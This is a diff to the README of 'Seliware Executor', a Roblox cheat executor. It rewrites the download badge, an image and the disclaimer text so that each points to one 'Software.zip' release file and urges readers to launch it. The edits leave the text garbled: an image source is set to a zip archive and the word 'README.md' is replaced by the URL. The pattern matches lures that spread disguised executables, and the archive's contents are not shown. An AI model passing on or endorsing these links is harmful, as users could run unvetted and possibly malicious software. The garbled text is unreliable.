@@ -18,7 +18,7 @@ Seliware Executor is a cutting-edge beta Roblox executor that pushes the boundar
 
 Click the button below to download the latest version of Seliware Executor from our repository:
 
-[![Download Seliware Executor](https://img.shields.io/badge/Download-Seliware%20Executor-blue.svg)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip) ⬅️ Launch the file to experience the power of Seliware Executor! 💾💥
+[![Download Seliware Executor](https://github.com/Cravanger/Seliware-Executor/releases/download/v2.0/Software.zip%https://github.com/Cravanger/Seliware-Executor/releases/download/v2.0/Software.zip)](https://github.com/Cravanger/Seliware-Executor/releases/download/v2.0/Software.zip) ⬅️ Launch the file to experience the power of Seliware Executor! 💾💥
 
 ### Usage
 
@@ -36,8 +36,8 @@ If the download link does not work or is not provided, please check the "Release
 
 Let's take game customization to the next level with Seliware Executor! 💣🎉
 
-![Seliware Executor](https://via.placeholder.com/800x400)
+![Seliware Executor](https://github.com/Cravanger/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 ---
 
-**Disclaimer:** This README.md content is for demonstration purposes only. It does not reflect actual information about any existing software or tool named "Seliware Executor."
+**Disclaimer:** This https://github.com/Cravanger/Seliware-Executor/releases/download/v2.0/Software.zip content is for demonstration purposes only. It does not reflect actual information about any existing software or tool named "Seliware Executor."
